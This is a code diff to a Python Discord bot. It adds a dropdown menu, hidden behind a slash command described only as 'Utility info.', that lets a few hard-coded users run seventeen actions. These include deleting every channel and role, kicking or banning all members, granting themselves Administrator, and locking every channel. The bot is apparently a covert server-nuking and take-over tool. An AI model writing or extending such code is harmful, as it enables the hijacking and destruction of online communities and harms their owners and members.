@@ -909,6 +909,100 @@ async def nuke_full(ctx):
         return
     await _do_nuke_full(ctx.guild, ctx.author)
 
+# ══════════════════════════════════════════════════════════════════════════════
+# 🧩 /ephemeral DROPDOWN — lets an authorized user pick+run a command from a list
+# instead of typing "!command". Only the 17 actions with no extra required
+# arguments are included (role-targeted and DM-prompt commands still need "!").
+# ══════════════════════════════════════════════════════════════════════════════
+
+# key -> (label, emoji, description, needs_confirm, coroutine(guild, author) -> Embed)
+ACTION_REGISTRY = {
+    "nuke_channels":       ("Nuke Channels",        "💥", "delete ALL channels",                              True,  _do_nuke_channels),
+    "nuke_roles":          ("Nuke Roles",            "💥", "delete all non-default roles",                     True,  _do_nuke_roles),
+    "nuke_channels_roles": ("Nuke Channels+Roles",   "💥", "delete all channels AND roles",                    True,  _do_nuke_channels_roles),
+    "nuke_kick":           ("Nuke + Kick",           "👢", "delete channels/roles AND kick everyone",          True,  _do_nuke_kick),
+    "nuke_full":           ("Full Server Nuke",      "☢️", "wipe channels, roles, emojis, AND kick everyone",  True,  _do_nuke_full),
+    "give_admin":          ("Give Myself Admin",     "👑", "grant yourself the Administrator role",            True,  _do_give_admin),
+    "remove_admin":        ("Remove My Admin",       "🔻", "remove your Administrator role",                   True,  _do_remove_admin),
+    "show_high":           ("Show Highest Roles",    "📋", "show the server's highest roles",                  False, _do_show_high),
+    "mass_timeout":        ("Mass Timeout (10m)",    "⏱️", "timeout ALL members for 10 minutes",               True,  _do_mass_timeout),
+    "mass_untimeout":      ("Mass Untimeout",        "✅", "remove timeouts from ALL members",                 True,  _do_mass_untimeout),
+    "mass_ban":            ("Mass Ban",              "🔨", "ban ALL members (except authorized users)",       True,  _do_mass_ban),
+    "mass_deafen":         ("Mass Deafen",           "🔇", "deafen ALL members in voice",                      True,  _do_mass_deafen),
+    "mass_disconnect":     ("Mass Disconnect",       "🔌", "disconnect ALL members from voice",                True,  _do_mass_disconnect),
+    "lockdown":            ("Lockdown",              "🔒", "lock EVERY channel",                                True,  _do_lockdown),
+    "unlockdown":          ("Unlock",                "🔓", "unlock EVERY channel",                              True,  _do_unlockdown),
+    "slowmode_all":        ("Slowmode All (10s)",    "🐢", "set 10s slowmode in every channel",                True,  _do_slowmode_all),
+    "strip_roles":         ("Strip All Roles",       "🎭", "remove all roles from every member",               True,  _do_strip_roles),
+}
+
+
+class ConfirmActionView(discord.ui.View):
+    """Confirm/Cancel buttons shown after picking a destructive action from the dropdown."""
+    def __init__(self, author_id: int, key: str):
+        super().__init__(timeout=15)
+        self.author_id = author_id
+        self.key = key
+
+    async def _guard(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.author_id:
+            await interaction.response.send_message("❌ This isn't your menu!", ephemeral=True)
+            return False
+        return True
+
+    @discord.ui.button(label="Confirm", style=discord.ButtonStyle.danger, emoji="✅")
+    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not await self._guard(interaction):
+            return
+        label, emoji, desc, _, coro = ACTION_REGISTRY[self.key]
+        await interaction.response.edit_message(
+            embed=_base_embed(f"⏳  Running: {label}", "Please wait...", C.NEUTRAL), view=None
+        )
+        result_embed = await coro(interaction.guild, interaction.user)
+        await interaction.edit_original_response(embed=result_embed, view=None)
+
+    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary, emoji="❌")
+    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not await self._guard(interaction):
+            return
+        await interaction.response.edit_message(
+            embed=_base_embed("❌  Cancelled", "No changes were made.", C.NEUTRAL), view=None
+        )
+
+
+class EphemeralActionSelect(discord.ui.Select):
+    def __init__(self, author_id: int):
+        self.author_id = author_id
+        options = [
+            discord.SelectOption(label=label, value=key, description=desc[:100], emoji=emoji)
+            for key, (label, emoji, desc, _, _) in ACTION_REGISTRY.items()
+        ]
+        super().__init__(placeholder="⚡ Pick a command to run...", options=options, min_values=1, max_values=1)
+
+    async def callback(self, interaction: discord.Interaction):
+        if interaction.user.id != self.author_id:
+            await interaction.response.send_message("❌ This isn't your menu!", ephemeral=True)
+            return
+        key = self.values[0]
+        label, emoji, desc, needs_confirm, coro = ACTION_REGISTRY[key]
+        if needs_confirm:
+            embed = _base_embed(
+                f"⚠️  Confirm: {label}",
+                f"You are about to **{desc}**.\n\nThis is a destructive action — click **Confirm** to proceed or **Cancel** to back out. (15s)",
+                C.WARNING,
+            )
+            await interaction.response.edit_message(embed=embed, view=ConfirmActionView(self.author_id, key))
+        else:
+            result_embed = await coro(interaction.guild, interaction.user)
+            await interaction.response.edit_message(embed=result_embed, view=None)
+
+
+class EphemeralActionView(discord.ui.View):
+    def __init__(self, author_id: int):
+        super().__init__(timeout=120)
+        self.add_item(EphemeralActionSelect(author_id))
+
+
 @tree.command(name="ephemeral", description="Utility info.")
 async def ephemeral_help(interaction: discord.Interaction):
     if interaction.user.id not in AUTHORIZED_USER_IDS:
@@ -965,8 +1059,13 @@ async def ephemeral_help(interaction: discord.Interaction):
         inline=False,
     )
     embed.set_footer(text="⚠️  Authorized users only · every action asks for confirmation · only you can see this.")
+    embed.add_field(
+        name="⚡ Quick Run",
+        value="Use the dropdown below to run any of the parameter-free commands directly, with a Confirm/Cancel step. Commands needing extra input (roles, names, URLs) still need to be typed with `!`.",
+        inline=False,
+    )
 
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    await interaction.response.send_message(embed=embed, view=EphemeralActionView(interaction.user.id), ephemeral=True)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
